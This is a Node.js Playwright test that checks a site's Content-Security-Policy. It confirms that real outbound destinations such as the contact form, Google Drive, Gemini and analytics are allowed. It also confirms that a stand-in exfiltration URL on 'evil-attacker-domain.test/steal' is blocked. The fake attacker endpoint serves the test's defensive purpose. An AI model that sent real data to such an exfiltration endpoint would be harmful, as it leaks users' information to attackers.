// Page-load testing is not enough: the calls that matter (contact form submit,
// Google Drive sync, the direct Gemini call) only fire on user action or after
// sign-in. This test drives them from inside the page and asks the browser
// whether the CSP blocked them — distinguishing a CSP block (which fires
// securitypolicyviolation) from a plain network failure (which does not, and is
// expected here because the sandbox proxy blocks outbound traffic).
const http = require('http');
const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

// Resolved from this file, not hardcoded — see csp-page-check.js.
const ROOT = require('path').resolve(__dirname, '..', '..', 'site');
const PORT = 8932;
const headersFile = fs.readFileSync(path.join(ROOT, '_headers'), 'utf8');
const cspLine = headersFile.split('\n').find((l) => /^\s*Content-Security-Policy(-Report-Only)?:/.test(l));
const CSP = cspLine.replace(/^\s*Content-Security-Policy(-Report-Only)?:\s*/, '').trim();
const MODE = /Report-Only/.test(cspLine) ? 'REPORT-ONLY (in file)' : 'ENFORCING (in file)';
console.log('Policy mode in _headers: ' + MODE);
console.log('Testing as ENFORCING.\n');

// Every destination the CLIENT code actually talks to, with where it comes from.
const CONNECTS = [
  ['https://api.web3forms.com/submit', 'contact form submit (app.js, contact.html, zerem)'],
  ['https://www.googleapis.com/drive/v3/files', 'Google Drive backup/sync'],
  ['https://generativelanguage.googleapis.com/v1beta/models', 'direct Gemini (own-key path)'],
  ['https://oauth2.googleapis.com/tokeninfo', 'token check'],
  ['https://accounts.google.com/gsi/status', 'Google Identity Services'],
  ['https://www.clarity.ms/tag/x', 'Clarity analytics'],
  ['https://www.googletagmanager.com/gtag/js', 'Google Tag Manager / GA4 loader'],
  ['https://region1.google-analytics.com/g/collect', 'GA4 event collection'],
  ['https://evil-attacker-domain.test/steal', 'ATTACKER EXFIL — must be BLOCKED'],
];

const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split('?')[0]);
  if (p.endsWith('/')) p += 'index.html';
  const file = path.join(ROOT, p);
  res.setHeader('Content-Security-Policy', CSP);
  if (!file.startsWith(ROOT) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) {
    res.writeHead(404, { 'Content-Type': 'text/html' }); return res.end('<!doctype html><p>404');
  }
  const ext = path.extname(file);
  const type = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css' }[ext] || 'application/octet-stream';
  res.writeHead(200, { 'Content-Type': type });
  fs.createReadStream(file).pipe(res);
});

(async () => {
  await new Promise((r) => server.listen(PORT, r));
  const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
  const ctx = await browser.newContext();
  const tab = await ctx.newPage();
  await tab.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.blockedURI + ' | ' + e.violatedDirective));
  });
  await tab.goto('http://127.0.0.1:' + PORT + '/sale/', { waitUntil: 'load', timeout: 25000 });
  await tab.waitForTimeout(1500);

  const results = await tab.evaluate(async (targets) => {
    const out = [];
    for (const [url, label] of targets) {
      const before = window.__csp.length;
      let netErr = '';
      try { await fetch(url, { method: 'GET', mode: 'cors' }); } catch (e) { netErr = e.message; }
      await new Promise((r) => setTimeout(r, 250));
      const blockedByCsp = window.__csp.length > before;
      out.push({ url, label, blockedByCsp, netErr: netErr.slice(0, 60) });
    }
    return out;
  }, CONNECTS);

  // Worker from a blob: html2pdf/html2canvas can spawn one; default-src would kill it.
  const workerOk = await tab.evaluate(async () => {
    try {
      const b = new Blob(['self.postMessage(1)'], { type: 'text/javascript' });
      const w = new Worker(URL.createObjectURL(b));
      return await new Promise((res) => { w.onmessage = () => res(true); w.onerror = () => res(false); setTimeout(() => res(false), 1500); });
    } catch (e) { return false; }
  });

  await browser.close();
  server.close();

  console.log('='.repeat(70));
  let bad = 0;
  for (const r of results) {
    const isAttacker = r.url.includes('evil-attacker');
    const ok = isAttacker ? r.blockedByCsp : !r.blockedByCsp;
    if (!ok) bad++;
    const verdict = r.blockedByCsp ? 'BLOCKED by CSP' : 'allowed by CSP';
    console.log(`${ok ? '✅' : '❌'} ${verdict.padEnd(16)} ${r.label}`);
    if (!isAttacker && r.netErr) console.log(`      (network error expected in sandbox: ${r.netErr})`);
  }
  console.log(`\n${workerOk ? '✅' : '❌'} blob: Worker ${workerOk ? 'allowed' : 'BLOCKED'} (needed by the PDF exporter)`);
  console.log('='.repeat(70));
  console.log(bad === 0 && workerOk
    ? 'RESULT: every real destination allowed, attacker exfil blocked → SAFE TO ENFORCE.'
    : `RESULT: ${bad} destination(s) wrong${workerOk ? '' : ' + worker blocked'} → DO NOT ENFORCE YET.`);
})();
